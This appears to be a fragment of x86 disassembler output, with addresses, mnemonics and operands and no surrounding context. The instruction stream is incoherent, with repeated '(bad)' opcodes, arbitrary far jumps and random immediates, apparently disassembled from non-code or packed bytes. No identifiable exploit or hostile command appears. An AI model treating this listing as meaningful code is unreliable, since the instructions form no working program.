  423753:	lock and BYTE PTR [ecx-0x45],0xa6
  423758:	bound  esp,QWORD PTR [edx-0x60c71467]
  42375e:	aas    
  42375f:	ins    BYTE PTR es:[edi],dx
  423760:	xchg   edx,eax
  423761:	mov    ebp,0x69d59002
  423766:	xor    al,0x0
  423768:	add    eax,0xf9fd65d0
  42376d:	js     0x42370c
  42376f:	push   0x4c8d69f4
  423774:	and    eax,0x6da40235
  423779:	sbb    BYTE PTR [ebx-0x7c],al
  42377c:	cmpps  xmm0,xmm4,0x98
  423780:	and    al,0x26
  423782:	arpl   WORD PTR [esi],sp
  423784:	push   cs
  423785:	xchg   ebp,eax
  423786:	push   esp
  423787:	mov    edi,0x1f452abe
  42378c:	lds    esp,FWORD PTR [eax]
  42378e:	daa    
  42378f:	jge    0x423791
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7a74:0xf91f53f9
  423806:	add    DWORD PTR [eax],eax
  423808:	add    al,0x1
  42380a:	add    BYTE PTR [eax],al
  42380c:	lods   eax,DWORD PTR ds:[esi]
  42380d:	fs leave 
  42380f:	add    al,0xa1
  423811:	outs   dx,DWORD PTR ds:[esi]
  423812:	sar    al,1
  423814:	arpl   WORD PTR [esi+0x6b],bx
  423817:	pop    edx
  423818:	std    
  423819:	sar    DWORD PTR [eax+0x575d7cee],1
  42381f:	add    DWORD PTR [edi-0x5d],esi
  423822:	scas   eax,DWORD PTR es:[edi]
  423823:	inc    ebp
  423824:	pop    ebx
  423825:	retf   0x8707
  423828:	xchg   ecx,eax
  423829:	or     al,0x1
  42382b:	arpl   WORD PTR [esi-0x2f105a7b],sp
  423831:	icebp  
  423832:	arpl   WORD PTR [ecx],bp
  423834:	and    DWORD PTR [edx-0xa],edx
  423837:	mov    dl,0x19
  423839:	cmp    al,0x7b
  42383b:	dec    esi
  42383d:	xchg   esi,eax
  42383e:	div    DWORD PTR [edx-0x19]
  423841:	push   edi
  423842:	dec    ecx
  423843:	xor    BYTE PTR [ecx],ch
  423845:	pop    ecx
  423846:	(bad)  
  423848:	pop    ds
  423849:	jae    0x4237dd
  42384b:	inc    esp
  42384c:	add    DWORD PTR [edx+0x152e36d6],0xffffffac
  423853:	das    
  423854:	cs stos BYTE PTR es:[edi],al
  423856:	fisttp WORD PTR [ecx+0xebafba0]
  42385c:	add    cl,bl
  42385e:	push   ebp
  42385f:	clc    
  423860:	ffreep st(5)
  423862:	sub    ebx,DWORD PTR [eiz*8-0x21f74d73]
  423869:	xchg   DWORD PTR [ebx],ebx
  42386b:	or     al,0x7f
  42386d:	sbb    bh,BYTE PTR [edx+0xb]
  423870:	adc    al,0x8e
  423872:	jmp    0x75a8:0xfdafdd52
  423879:	mov    al,ds:0x18215bb8
  42387e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42387f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423880:	in     al,dx
  423881:	inc    ecx
  423882:	das    
  423883:	jmp    0x459b86e9
  423888:	adc    esi,eax
  42388a:	fimul  WORD PTR [ebx+0x21c3f66f]
  423890:	aaa    
  423891:	lds    ebp,FWORD PTR [edi+0x11]
  423894:	cmp    BYTE PTR [eax-0x7f],ch
  423897:	cmp    DWORD PTR [ecx],ebp
  423899:	or     DWORD PTR [ebx+0x54],edx
  42389c:	cmp    al,0x5a
  42389e:	cli    
  42389f:	push   eax
  4238a0:	mov    bl,0x58
  4238a2:	jns    0x4238b8
  4238a4:	xor    BYTE PTR [edx],ah
  4238a6:	xor    esp,ecx
  4238a8:	aas    
  4238a9:	shl    al,cl
  4238ab:	enter  0x2e4,0xe8
  4238af:	xor    eax,0x232edf72
  4238b4:	xchg   edi,eax
  4238b5:	mov    ebx,0x3ae2b61
  4238ba:	inc    edi
  4238bb:	jmp    0x5a24bc9d
  4238c0:	(bad)  
  4238c1:	in     al,0x7c
  4238c3:	xor    DWORD PTR [ebp+0x18ba53b1],ebx
  4238c9:	xchg   edi,eax
  4238ca:	sbb    DWORD PTR [edx],eax
  4238cc:	fadd   DWORD PTR [ebp+esi*1-0x287e065f]
  4238d3:	or     ecx,DWORD PTR [eax]
  4238d5:	sti    
  4238d6:	dec    edx
  4238d7:	shl    BYTE PTR ds:0xe4029546,1
  4238dd:	pop    ebx
  4238de:	mov    ebx,0xed6dd53e
  4238e3:	xor    al,0xb3
  4238e5:	test   BYTE PTR [ebp-0x1e],bl
  4238e8:	dec    edx
  4238e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238ea:	xchg   esp,eax
  4238eb:	or     DWORD PTR [edi+0x695d57e2],ecx
  4238f1:	pushf  
  4238f2:	in     eax,0xcf
  4238f4:	sub    eax,ebp
  4238f6:	lea    esi,[ebx+0x7c9bcf41]
  4238fc:	(bad)  
  4238fe:	in     eax,dx
  4238ff:	ret    0x4d76
  423902:	loope  0x4238cb
  423904:	inc    ecx
  423905:	gs loope 0x423926
  423908:	add    DWORD PTR [eax],ecx
  42390a:	pop    ebp
  42390b:	dec    ecx
  42390c:	into   
  42390d:	inc    ebp
  42390e:	mov    bl,0x67
	...
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0xad392bbd
  423982:	icebp  
  423983:	xchg   edi,eax
  423984:	js     0x423a01
  423986:	add    DWORD PTR [eax],eax
  423988:	add    al,0x1
  42398a:	add    BYTE PTR [eax],al
  42398c:	fld    DWORD PTR [edi-0x39309ad4]
  423992:	jae    0x42398d
  423994:	fisttp WORD PTR [ebp-0x48]
  423997:	jae    0x4239a0
  423999:	dec    ebx
  42399a:	dec    BYTE PTR [ecx+0x30]
  42399d:	inc    edi
  42399e:	pop    esi
  42399f:	or     al,0x9a
  4239a1:	xor    ebp,DWORD PTR [esi]
  4239a3:	pop    ds
  4239a4:	and    ch,BYTE PTR [edi-0x56d7f0c5]
  4239aa:	mov    dl,0x78
  4239ac:	xchg   esp,eax
  4239ad:	int3   
  4239ae:	adc    al,0x38
  4239b0:	mov    ch,0x7c
  4239b2:	sahf   
  4239b3:	das    
  4239b4:	fnsave [edx-0x1e00ba24]
  4239ba:	aaa    
  4239bb:	pop    eax
  4239bc:	pop    edi
  4239bd:	and    DWORD PTR [ebp-0x3f7afe74],ebx
  4239c3:	or     edi,DWORD PTR [edx-0x2f]
  4239c6:	or     DWORD PTR ss:[edx-0x61],edx
  4239ca:	jmp    DWORD PTR [ecx]
  4239cc:	dec    BYTE PTR [edx]
  4239ce:	daa    
  4239cf:	push   cs
  4239d0:	inc    ebx
  4239d1:	ins    BYTE PTR es:[edi],dx
  4239d2:	add    al,0x1c
  4239d4:	in     eax,dx
  4239d5:	movzx  esi,WORD PTR [ebp+ecx*2+0x74bc6e1d]
  4239dd:	inc    edx
  4239de:	and    BYTE PTR [esi],0xef
  4239e1:	xlat   BYTE PTR ds:[ebx]
  4239e2:	je     0x423a06
  4239e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239e5:	(bad)  
  4239e6:	and    DWORD PTR [ebp-0x69],ebp
  4239e9:	inc    ebx
  4239ea:	cld    
  4239eb:	adc    DWORD PTR [ebx],edx
  4239ed:	cwde   
  4239ee:	sar    eax,cl
  4239f0:	js     0x4239cb
  4239f2:	pop    ss
  4239f3:	sahf   
  4239f4:	xchg   esp,eax
  4239f5:	and    esp,esp
  4239f7:	icebp  
  4239f8:	xchg   DWORD PTR [ecx],ebp
  4239fa:	mov    edi,0xb691df3a
  4239ff:	mov    edi,0x5876bae
  423a04:	and    al,0x81
  423a06:	sub    DWORD PTR [esi-0x12243c95],edi
  423a0c:	in     eax,0x95
  423a0e:	ins    BYTE PTR es:[edi],dx
  423a0f:	pop    esp
  423a10:	call   0xd9c9:0xd3c0c630
  423a17:	jg     0x4239aa
  423a19:	adc    ch,BYTE PTR [edi+0x3e8028aa]
  423a1f:	pop    ebp
  423a20:	lods   eax,DWORD PTR ds:[esi]
  423a21:	retf   
  423a22:	sbb    al,BYTE PTR [esi]
  423a24:	rol    DWORD PTR [ebp-0x5cd8e20],0xa3
  423a2b:	push   ecx
  423a2c:	pmaddwd mm6,QWORD PTR [ecx-0x31836944]
  423a33:	and    DWORD PTR [ebx-0x43],0x84e8d48a
  423a3a:	xchg   edi,eax
  423a3b:	test   DWORD PTR [edx],0xb73c2c20
  423a41:	imul   eax,ebp,0x52
  423a44:	add    eax,0x30d2a623
  423a49:	sahf   
  423a4a:	in     al,dx
  423a4b:	pop    ds
  423a4c:	and    al,0xb0
  423a4e:	fs xchg esp,eax
  423a50:	jo     0x423a94
  423a52:	ss jle 0x423a61
  423a55:	sub    dh,ah
  423a57:	adc    esi,esp
  423a59:	mov    al,0xe4
  423a5b:	stos   BYTE PTR es:[edi],al
  423a5c:	addr16 dec edx
  423a5e:	mov    esi,0xc7b797d6
  423a63:	daa    
  423a64:	push   fs
  423a66:	push   ebx
  423a67:	aas    
  423a68:	gs aam 0x54
  423a6b:	stc    
  423a6c:	inc    esp
  423a6d:	pop    ebp
  423a6e:	sub    DWORD PTR ds:0x53a0122b,ebp
  423a74:	lods   eax,DWORD PTR ds:[esi]
  423a75:	test   dl,cl
  423a77:	jae    0x423a28
  423a79:	hlt    
  423a7a:	lds    esp,FWORD PTR [eax+0x4c]
  423a7d:	leave  
  423a7e:	pop    es
  423a7f:	int3   
  423a80:	and    al,0x63
  423a82:	fld    QWORD PTR [edx+0x72a6ab02]
  423a88:	jmp    0x3983251a
  423a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a8e:	xchg   BYTE PTR ds:0x0,bl
	...
  423af4:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	pop    esi
  423b01:	push   ebx
  423b02:	sub    eax,0x17c7ca2
  423b07:	add    BYTE PTR [ecx+eax*1],al
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	or     al,al
  423b0e:	pop    ds
  423b0f:	jmp    0x21705db
  423b14:	outs   dx,BYTE PTR ds:[esi]
  423b15:	test   al,0x5b
  423b17:	ficom  WORD PTR [esi]
  423b19:	mov    bh,al
  423b1b:	adc    eax,0x4091a431
  423b20:	jmp    0x4f60:0xbcbf7e7c
  423b27:	pop    ebx
  423b28:	or     BYTE PTR [esi-0x7fc7f58d],bh
  423b2e:	and    ebx,esi
  423b30:	mov    dh,0xa8
  423b32:	cmp    cl,BYTE PTR [ebx+0x16]
  423b35:	xchg   ebx,eax
  423b36:	jmp    0x423b78
  423b38:	mov    ds:0xff7c5e44,al
  423b3d:	inc    eax
  423b3e:	dec    esp
  423b3f:	and    ah,BYTE PTR [edx]
  423b41:	retf   0x8dda
  423b44:	xor    al,0x2c
  423b46:	cli    
  423b47:	addr16 push ebp
  423b49:	test   esp,0xd26e6a37
  423b4f:	cmp    al,0x6a
  423b51:	jecxz  0x423b77
  423b53:	mov    cl,0xa8
  423b55:	lea    edi,[eax]
  423b57:	sub    ah,BYTE PTR [edx-0x1988d69]
  423b5d:	pop    ss
  423b5e:	inc    ebx
  423b5f:	int    0x9a
  423b61:	ret    0x34b
  423b64:	adc    DWORD PTR [ebx+eax*8+0x71],esi
  423b68:	enter  0x5a4d,0x38
  423b6c:	or     bl,BYTE PTR [edx+0x2c2790d2]
  423b72:	xchg   edx,eax
  423b73:	pop    es
  423b74:	pop    ebp
  423b75:	f2xm1  
  423b77:	dec    edx
  423b78:	pop    ss
  423b79:	xlat   BYTE PTR ds:[ebx]
  423b7a:	rcr    DWORD PTR [ebx-0x6361ebe9],0xfe
  423b81:	(bad)  
  423b82:	lods   eax,DWORD PTR ds:[esi]
  423b83:	jmp    0x423b73
  423b85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b86:	jg     0x423bdd
  423b88:	xchg   ecx,eax
  423b89:	lods   eax,DWORD PTR ds:[esi]
  423b8a:	cmp    eax,0xc8cb5733
  423b8f:	hlt    
  423b90:	arpl   bx,si
  423b92:	dec    ecx
  423b93:	pop    ecx
  423b94:	jo     0x423b8b
  423b96:	xor    BYTE PTR [edx+0x32],ch
  423b99:	pop    ebx
  423b9a:	data16 mov bh,0x36
  423b9d:	adc    DWORD PTR [ecx+ecx*2],edx
  423ba0:	iret   
  423ba1:	mov    ecx,ecx
  423ba3:	cmp    bl,BYTE PTR [ebx]
  423ba5:	ja     0x423bac
  423ba7:	aam    0x3c
  423ba9:	shl    BYTE PTR [ebp+eax*1-0x2c],0x57
  423bae:	loop   0x423b5b
  423bb0:	jmp    0x423b51
  423bb2:	loopne 0x423bf0
  423bb4:	adc    dh,BYTE PTR [eax-0x42]
  423bb7:	mov    ss,WORD PTR [eax-0x233dfd26]
  423bbd:	fistp  DWORD PTR [esi-0xb]
  423bc0:	popf   
  423bc1:	adc    BYTE PTR [esi-0x7e],dh
  423bc4:	ins    BYTE PTR es:[edi],dx
  423bc5:	pop    ecx
  423bc6:	xchg   esp,eax
  423bc7:	jb     0x423bdb
  423bc9:	loop   0x423bbd
  423bcb:	or     eax,0xc1e134f0
  423bd0:	repnz xlat BYTE PTR ds:[ebx]
  423bd2:	push   0x7ac82cb9
  423bd7:	mov    edx,0xe286b14f
  423bdc:	push   eax
  423bdd:	jl     0x423bc3
  423bdf:	xchg   ebp,eax
  423be0:	add    ebx,DWORD PTR [eax]
  423be2:	fisttp DWORD PTR [edi-0x26]
  423be5:	and    al,ah
  423be7:	test   DWORD PTR ds:0xb24f6e73,eax
  423bed:	stos   BYTE PTR es:[edi],al
  423bee:	ficom  WORD PTR [ebp+0x4c]
  423bf1:	shr    BYTE PTR [esi],0x6c
  423bf4:	jmp    0x954a:0x7c01747d
  423bfb:	repz jnp 0x423bc0
  423bfe:	js     0x423c28
  423c00:	push   cs
  423c01:	pusha  
  423c02:	dec    esp
  423c03:	iret   
  423c04:	data16 (bad) 
  423c06:	fiadd  DWORD PTR [eax+0x5247483a]
  423c0c:	inc    ecx
  423c0d:	push   0xca42
	...
  423c72:	add    BYTE PTR [eax],al
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0xe446617]
  423c81:	jge    0x423c77
  423c83:	or     al,0x80
  423c85:	jge    0x423c88
  423c87:	add    BYTE PTR [ecx+eax*1],al
  423c8a:	add    BYTE PTR [eax],al
  423c8c:	es jp  0x423c44
  423c8f:	in     eax,0x7c
  423c91:	mov    dl,bh
  423c93:	daa    
  423c94:	inc    esp
  423c95:	jecxz  0x423d0b
  423c97:	repnz xor DWORD PTR [edx+0x23],esi
  423c9b:	and    cl,0xd0
  423c9e:	mov    cl,BYTE PTR [edi]
  423ca0:	enter  0x5d3,0x98
  423ca4:	push   eax
  423ca5:	iret   
  423ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ca7:	jbe    0x423ca9
  423ca9:	jle    0x423d24
  423cab:	fisttp WORD PTR [edi]
  423cad:	xor    al,0xcc
  423caf:	or     esp,eax
  423cb1:	(bad)  
  423cb2:	mov    bh,0xf8
  423cb4:	mov    BYTE PTR [ebp-0x2f],bl
  423cb7:	aas    
  423cb8:	std    
  423cb9:	nop
  423cba:	inc    esp
  423cbb:	ins    DWORD PTR es:[edi],dx
  423cbc:	inc    esi
  423cbd:	pop    ss
  423cbe:	jmp    DWORD PTR [ebx]
  423cc0:	mov    ah,0x80
  423cc2:	push   0xffffffb7
  423cc4:	aas    
  423cc5:	call   0x4f5547c9
  423cca:	xchg   ecx,eax
  423ccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ccc:	call   0xd2445516
  423cd1:	retf   
  423cd2:	mov    dl,0xbf
  423cd4:	sbb    ebx,DWORD PTR [ecx]
  423cd6:	out    dx,eax
  423cd7:	adc    ebx,DWORD PTR [edx+0x1ee0d318]
  423cdd:	pop    ss
  423cde:	dec    ebp
  423cdf:	dec    edx
  423ce0:	and    DWORD PTR [ecx],0x18
  423ce3:	mov    al,ds:0x24305239
  423ce8:	pop    esp
  423ce9:	aad    0xaa
  423ceb:	test   eax,0x29ea1cbb
  423cf0:	dec    edx
  423cf1:	pop    ebx
  423cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cf3:	jae    0x423d3b
  423cf5:	popa   
  423cf6:	mov    edx,0x1ed30106
  423cfb:	jbe    0x423d77
  423cfd:	mov    BYTE PTR [ebx+esi*2],al
  423d00:	xchg   cl,bl
  423d02:	push   edx
  423d03:	xor    BYTE PTR [edi],dl
  423d05:	sub    eax,0xcb4c26cb
  423d0a:	xchg   DWORD PTR [ecx+0x679c2276],edi
  423d10:	imul   edi,ebp,0x2a
  423d13:	js     0x423cdb
  423d15:	add    eax,0xdcc53da2
  423d1a:	leave  
  423d1b:	out    dx,al
  423d1c:	cwde   
  423d1d:	push   cs
  423d1e:	pusha  
  423d1f:	jecxz  0x423d45
  423d21:	xchg   ecx,eax
  423d22:	and    DWORD PTR [edx-0xf],esi
  423d25:	fs ret 
  423d27:	sti    
  423d28:	repz std 
  423d2a:	mov    ah,0x12
  423d2c:	je     0x423da1
  423d2e:	mov    ebp,0x84c94b71
  423d33:	rcr    BYTE PTR [edx],0xd
  423d36:	push   edx
  423d37:	inc    ebx
  423d38:	scas   al,BYTE PTR es:[edi]
  423d39:	stc    
  423d3a:	test   BYTE PTR fs:[esi],bh
  423d3d:	fstp   TBYTE PTR [eax]
  423d3f:	je     0x423d34
  423d41:	sbb    ebp,DWORD PTR [ebx-0x5]
  423d44:	std    
  423d45:	out    dx,al
  423d46:	out    dx,al
  423d47:	xchg   edi,eax
  423d48:	jno    0x423ccf
  423d4a:	sbb    cl,BYTE PTR [esi-0x335551d]
  423d50:	inc    esi
  423d51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d52:	sub    ecx,DWORD PTR [eax+0x4]
  423d55:	cs mov ebp,esi
  423d58:	or     DWORD PTR [ecx],edi
  423d5a:	not    DWORD PTR [eax]
  423d5c:	mov    bl,al
  423d5e:	mov    edi,DWORD PTR [ebp+0x69]
  423d61:	jmp    0xd7e8:0xa90f7e61
  423d68:	ficom  DWORD PTR [esi]
  423d6a:	mov    esp,0x7e0aa4fa
  423d6f:	adc    BYTE PTR [edi-0x20],cl
  423d72:	and    edi,0x36
  423d75:	pop    ecx
  423d76:	js     0x423d1a
  423d78:	inc    ecx
  423d79:	nop
  423d7a:	mov    edx,0xdd02fcf8
  423d7f:	xor    ax,0x3e62
  423d83:	lods   al,BYTE PTR ds:[esi]
  423d84:	out    dx,eax
  423d85:	or     BYTE PTR [eax-0x76],ah
  423d88:	xchg   edi,eax
  423d89:	(bad)  
  423d8b:	cmp    BYTE PTR [esi-0x32],0x5c
  423d8f:	mov    WORD PTR [eax],es
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax+0x3e4077d2],esp
  423e03:	jmp    0x104:0x17e84
  423e0a:	add    BYTE PTR [eax],al
  423e0c:	(bad)  
  423e0d:	das    
  423e0e:	push   edi
  423e0f:	mov    eax,ds:0xeb4a3d0
  423e14:	stos   BYTE PTR es:[edi],al
  423e15:	mov    ds:0x69bb056b,al
  423e1a:	sub    al,0x72
  423e1d:	or     al,0xa0
  423e1f:	mov    ebp,edi
  423e21:	sbb    ecx,DWORD PTR [eax-0x59988ea0]
  423e27:	add    BYTE PTR [eax-0x303c5019],0xd0
  423e2e:	xchg   DWORD PTR [ecx-0x763634b8],edi
  423e34:	mov    ebp,0x7130c5cb
  423e39:	hlt    
  423e3a:	cmp    esp,ebx
  423e3c:	xor    BYTE PTR [ebx+0x2],0xe0
  423e40:	cmc    
  423e41:	and    DWORD PTR [ebp-0x6a],ebp
  423e44:	test   eax,0xb17014b2
  423e49:	mov    cl,0x69
  423e4b:	xor    al,0xeb
  423e4d:	in     al,0xef
  423e4f:	js     0x423e84
  423e51:	add    al,0x5c
  423e53:	div    BYTE PTR [esi+ebx*4]
  423e56:	outs   dx,BYTE PTR ds:[esi]
  423e57:	sub    edi,DWORD PTR [edx-0x3ba7409]
  423e5d:	pop    edi
  423e5e:	jmp    0x423e16
  423e60:	lods   al,BYTE PTR ds:[esi]
  423e61:	and    BYTE PTR [eax+eiz*2+0xa67d4ae],dh
  423e68:	ins    BYTE PTR es:[edi],dx
  423e69:	out    dx,al
  423e6a:	inc    ebx
  423e6b:	je     0x423ecb
  423e6d:	pop    esp
  423e6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e70:	mov    WORD PTR [esi+0x3185654f],?
  423e76:	xchg   DWORD PTR [ebx+0x4a],esi
  423e79:	sub    bh,bl
  423e7b:	sub    BYTE PTR [ebx],bl
  423e7d:	iret   
  423e7e:	adc    edx,ebp
  423e80:	sub    cl,dl
  423e82:	aas    
  423e83:	pusha  
  423e84:	jne    0x423e5d
  423e86:	mov    WORD PTR [ebp+0x1063e283],es
  423e8c:	stos   BYTE PTR es:[edi],al
  423e8d:	stc    
  423e8e:	sub    BYTE PTR [edi],0x93
  423e91:	cmp    ch,ah
  423e93:	xchg   esi,eax
  423e94:	mov    eax,0xa462164a
  423e99:	mov    eax,esp
  423e9b:	dec    ebp
  423e9c:	dec    eax
  423e9d:	(bad)  
  423e9e:	jmp    0x423ef7
  423ea0:	sub    DWORD PTR [edi],ebx
  423ea2:	out    dx,al
  423ea3:	ret    
  423ea4:	lock dec edx
  423ea6:	clc    
  423ea7:	fs sbb dh,cl
  423eaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423eab:	test   eax,0x4810bf11
  423eb0:	std    
  423eb1:	(bad)  
  423eb2:	sbb    al,0x62
  423eb4:	inc    ecx
  423eb5:	pushw  es
  423eb7:	popa   
  423eb8:	pop    es
  423eb9:	add    eax,0xa16c15aa
  423ebe:	leave  
  423ebf:	sub    DWORD PTR [esi+edx*4],ecx
  423ec2:	pop    esi
  423ec3:	retf   
  423ec4:	loop   0x423efc
  423ec6:	jno    0x423e71
  423ec8:	mov    ah,0x6c
  423eca:	pop    edi
  423ecb:	xchg   ebx,eax
  423ecc:	add    bl,dh
  423ece:	push   ss
  423ecf:	jnp    0x423e76
  423ed1:	jae    0x423f34
  423ed3:	shl    BYTE PTR [ebx+eiz*4],0xd2
  423ed7:	inc    ebp
  423ed8:	js     0x423eaf
  423eda:	imul   esp,DWORD PTR [esi+0x39],0x48
  423ede:	adc    edi,DWORD PTR [ebp-0x4d]
  423ee1:	dec    edi
  423ee2:	aaa    
  423ee3:	mov    al,ds:0x275f8f4b
  423ee8:	inc    eax
  423ee9:	mov    BYTE PTR [ebx+eiz*2-0x921d9d2],ah
  423ef0:	jae    0x423ec2
  423ef2:	sub    ebp,DWORD PTR [eax]
  423ef4:	push   0x12a7f8bf
  423ef9:	jnp    0x423e7f
  423efb:	outs   dx,DWORD PTR ds:[esi]
  423efc:	das    
  423efd:	shl    cl,0x7c
  423f00:	pop    edi
  423f01:	add    ah,BYTE PTR [esi-0x43bcd15a]
  423f07:	ret    
  423f08:	jns    0x423ef0
  423f0a:	jb     0x423f2a
  423f0c:	ja     0x423f40
  423f0e:	jb     0x423edb
	...
  423f74:	scas   al,BYTE PTR es:[edi]
  423f75:	call   0x9fff:0xff74b964
  423f7c:	adc    al,0x96
  423f7e:	sbb    al,0xd9
  423f80:	out    0x30,eax
  423f82:	cmp    BYTE PTR [ebx],bl
  423f84:	mov    BYTE PTR [edi+0x1],bh
  423f87:	add    BYTE PTR [ecx+eax*1],al
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	mov    BYTE PTR [ebx-0x4f],ah
  423f8f:	mov    BYTE PTR [ecx-0x78816c13],al
  423f95:	lock push eax
  423f97:	icebp  
  423f98:	aaa    
  423f99:	jbe    0x423f26
  423f9b:	retf   0x6182
  423f9e:	lods   al,BYTE PTR ds:[esi]
  423f9f:	pusha  
  423fa0:	fisttp QWORD PTR [eax]
  423fa2:	lds    esi,FWORD PTR [edx-0x65b980ff]
  423fa8:	mov    esp,0xb6ba2d0b
  423fad:	add    al,0x9b
  423faf:	or     bh,BYTE PTR [esi]
  423fb1:	fimul  WORD PTR [edx+0x1159bcc5]
  423fb7:	loopne 0x423f67
  423fb9:	leave  
  423fba:	jp     0x423f57
  423fbc:	arpl   WORD PTR [edi+0x2818ea8d],bp
  423fc2:	aas    
  423fc3:	or     edi,esi
  423fc5:	push   eax
  423fc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423fc7:	push   0x67
  423fc9:	or     DWORD PTR [ebp+ecx*8+0x5c78ba75],esi
  423fd0:	dec    ebp
  423fd1:	mov    ch,0xa8
  423fd3:	xchg   esp,eax
  423fd4:	outs   dx,DWORD PTR ds:[esi]
  423fd5:	mov    esp,0xa8bf8ec8
  423fda:	scas   al,BYTE PTR es:[edi]
  423fdb:	pop    eax
  423fdc:	or     eax,0xb9219fa8
  423fe1:	jno    0x424010
  423fe3:	sub    edi,eax
  423fe5:	aad    0xcd
  423fe7:	or     cl,cl
  423fe9:	mov    ebx,0x691c401d
  423fee:	hlt    
  423fef:	int    0x3b
  423ff1:	cmp    ah,BYTE PTR [ecx]
  423ff3:	addr16 cmc 
  423ff5:	and    esp,edx
  423ff7:	imul   esi,DWORD PTR [ebp+0x1b42d8c5],0x62518fa7
  424001:	cmp    cl,BYTE PTR [edx+0x30f4099f]
  424007:	std    
  424008:	imul   eax,DWORD PTR [edx-0x4c],0x7e1944fc
  42400f:	mov    bh,0xb4
  424011:	and    eax,0xa517c9fb
  424016:	mov    ecx,0xb6c474b3
  42401b:	popa   
  42401c:	mov    bl,0x5
  42401e:	or     ch,BYTE PTR [esi+0x72]
  424021:	mov    DWORD PTR [esp+esi*2+0x5e99844b],ebx
  424028:	dec    ebp
  424029:	por    mm0,QWORD PTR [esi+0x10]
  42402d:	dec    esi
  42402e:	dec    ebp
  42402f:	not    DWORD PTR [edx]
  424031:	cld    
  424032:	sbb    bh,BYTE PTR [ebp-0x28a00651]
  424038:	in     eax,dx
  424039:	xor    eax,0x507f1fc7
  42403e:	sub    eax,edi
  424040:	stos   BYTE PTR es:[edi],al
  424041:	jg     0x423ff2
  424043:	popf   
  424044:	dec    esi
  424045:	sbb    al,0x4c
  424047:	mov    esp,0x166dbe87
  42404c:	cmp    esi,edx
  42404e:	ss dec edi
  424050:	nop
  424051:	inc    edi
  424052:	test   DWORD PTR [ecx+0x3201e096],eax
  424058:	mov    dh,al
  42405a:	test   DWORD PTR [esi+edx*4+0x15],eax
  42405e:	cwde   
  42405f:	sbb    ah,BYTE PTR [edi+0x3e1d1cf6]
  424065:	test   eax,0x2bd88423
  42406a:	inc    ebx
  42406b:	mov    dl,BYTE PTR [ebp-0x3f]
  42406e:	and    BYTE PTR [esi-0x4c0d3139],dh
  424074:	sbb    al,0x66
  424076:	popfw  
  424078:	sub    eax,0x1b60a359
  42407d:	push   0xca4e3a9d
  424082:	jg     0x4240c8
  424084:	jmp    0x42401e
  424086:	mov    al,0x0
  424088:	jle    0x4240d3
  42408a:	push   esp
  42408b:	gs push eax
  42408d:	fwait
  42408e:	sbb    eax,0x32
	...
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	call   0x180:0x8ca9adcf
  424107:	add    BYTE PTR [ecx+eax*1],al
  42410a:	add    BYTE PTR [eax],al
  42410c:	adc    al,al
  42410e:	push   ss
  42410f:	jmp    FWORD PTR [ebx-0x50]
  424112:	cwde   
  424113:	mov    bh,0x9b
  424115:	lea    edi,[ebp+0x6f]
  424118:	lods   al,BYTE PTR ds:[esi]
  424119:	shr    edi,cl
  42411b:	pop    ss
  42411c:	paddusb mm3,QWORD PTR [ecx+0x7b]
  424120:	push   0x80a7a93d
  424125:	sbb    DWORD PTR gs:[eax+0x7],eax
  424129:	popf   
  42412a:	mov    eax,cs
  42412c:	mov    cl,0x1c
  42412e:	jmp    0x4240c2
  424130:	and    al,al
  424132:	mov    edi,0x3e233e81
  424137:	sub    al,0x46
  424139:	shr    BYTE PTR [edx],0xd6
  42413c:	mov    ah,0x58
  42413e:	std    
  42413f:	dec    edx
  424140:	stc    
  424141:	call   0x1845df14
  424146:	mov    eax,ds:0x9a27238e
  42414b:	icebp  
  42414c:	pop    ss
  42414d:	arpl   WORD PTR [esi],bx
  42414f:	enter  0x52ab,0x7f
  424153:	popf   
  424154:	jp     0x424187
  424156:	icebp  
  424157:	xor    BYTE PTR [edx],dl
  424159:	cmp    BYTE PTR [esi+ecx*8],dh
  42415c:	and    DWORD PTR [edx-0x77],ebx
  42415f:	mov    ds:0x64789b4,eax
  424164:	cdq    
  424165:	retf   
  424166:	jmp    0x8cbdc8c0
  42416b:	adc    ecx,ebx
  42416d:	xor    ebx,DWORD PTR [ebp+0x6cf60d]
  424173:	jecxz  0x424110
  424175:	or     DWORD PTR [ebx+0x6cd02d65],0x22
  42417c:	mov    ds:0x943f0716,al
  424181:	ret    
  424182:	stos   BYTE PTR es:[edi],al
  424183:	(bad)  
